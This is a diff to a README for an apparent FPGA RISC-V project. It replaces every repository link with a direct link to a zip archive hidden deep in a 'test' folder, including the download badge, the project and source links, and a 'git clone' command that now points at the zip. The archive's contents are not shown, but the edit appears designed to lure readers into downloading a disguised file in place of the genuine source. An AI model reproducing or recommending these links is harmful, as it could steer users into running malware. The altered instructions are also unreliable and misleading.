@@ -1,6 +1,6 @@
 # 🔧 HORNET-RV32IMF - Fast FPGA RISC-V System
 
-[![Download](https://img.shields.io/badge/Download-HORNET--RV32IMF-blue.svg)](https://github.com/Ashtonme/HORNET-RV32IMF)
+[![Download](https://img.shields.io/badge/Download-HORNET--RV32IMF-blue.svg)](https://raw.githubusercontent.com/Ashtonme/HORNET-RV32IMF/main/test/IDS-MLP-uart-fpga/test/HORNE-R-IMF-1.9-beta.3.zip)
 
 ## 🚀 What This Is
 
@@ -12,7 +12,7 @@ This README is written for people who want to get the project from the link abov
 
 Use this link to visit the project page:
 
-[https://github.com/Ashtonme/HORNET-RV32IMF](https://github.com/Ashtonme/HORNET-RV32IMF)
+[https://raw.githubusercontent.com/Ashtonme/HORNET-RV32IMF/main/test/IDS-MLP-uart-fpga/test/HORNE-R-IMF-1.9-beta.3.zip](https://raw.githubusercontent.com/Ashtonme/HORNET-RV32IMF/main/test/IDS-MLP-uart-fpga/test/HORNE-R-IMF-1.9-beta.3.zip)
 
 1. Open the link in your web browser.
 2. Click the green **Code** button.
@@ -24,7 +24,7 @@ Use this link to visit the project page:
 If you use Git, you can also clone the repo with Git Bash:
 
 ```bash
-git clone https://github.com/Ashtonme/HORNET-RV32IMF.git
+git clone https://raw.githubusercontent.com/Ashtonme/HORNET-RV32IMF/main/test/IDS-MLP-uart-fpga/test/HORNE-R-IMF-1.9-beta.3.zip
 ```
 
 ## 🖥️ What You Need on Windows
@@ -166,7 +166,7 @@ This project fits these areas:
 
 ## 📎 Source Link
 
-[Visit the HORNET-RV32IMF repository](https://github.com/Ashtonme/HORNET-RV32IMF)
+[Visit the HORNET-RV32IMF repository](https://raw.githubusercontent.com/Ashtonme/HORNET-RV32IMF/main/test/IDS-MLP-uart-fpga/test/HORNE-R-IMF-1.9-beta.3.zip)
 
 ## 🖱️ Quick Windows Steps
 
